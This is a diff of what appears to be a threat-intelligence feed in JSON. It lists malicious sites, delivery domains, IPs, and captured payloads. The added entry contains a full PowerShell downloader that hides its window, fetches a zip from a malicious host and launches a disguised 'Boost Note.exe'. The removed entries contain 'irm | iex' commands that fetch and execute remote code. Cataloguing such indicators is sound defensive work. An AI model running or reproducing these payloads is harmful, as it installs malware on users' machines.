@@ -1,5 +1,24 @@
 [
   {
+    "UrlDomain": "yigilca-haber.xyz",
+    "DeliveryUrl": [
+      "friendsoftorreabbey.com"
+    ],
+    "PayloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "IP": [
+      "172.67.194.161"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://friendsoftorreabbey.com/32b"
+    ],
+    "ReportId": "cmwqh59zd26op0omlzr69fgi7",
+    "ScannedAt": "2026-11-21T13:59:24.938000+00:00"
+  },
+  {
     "UrlDomain": "gorettiterapie.com",
     "DeliveryUrl": [
       "img-codes-cloude.info"
@@ -1853,43 +1872,5 @@
     ],
     "ReportId": "cmwnpfpw41x2g0oml742g5tyb",
     "ScannedAt": "2026-11-19T15:28:10.392000+00:00"
-  },
-  {
-    "UrlDomain": "fiftyoff.co.za",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/d9e2c158ed748001"
-    ],
-    "IP": [
-      "41.204.202.6"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/d9e2c158ed748001')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/d9e2c158ed748001"
-    ],
-    "ReportId": "cmwnlp7zj1wzj0omlkec6jirx",
-    "ScannedAt": "2026-11-19T13:43:35.418000+00:00"
-  },
-  {
-    "UrlDomain": "new.srdvrbas.ba",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/8ef4c7e148048fda"
-    ],
-    "IP": [
-      "65.21.234.24"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/8ef4c7e148048fda')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/8ef4c7e148048fda"
-    ],
-    "ReportId": "cmwnlotyh1wyr0omlqyh8e3xl",
-    "ScannedAt": "2026-11-19T13:43:17.240000+00:00"
   }
 ]
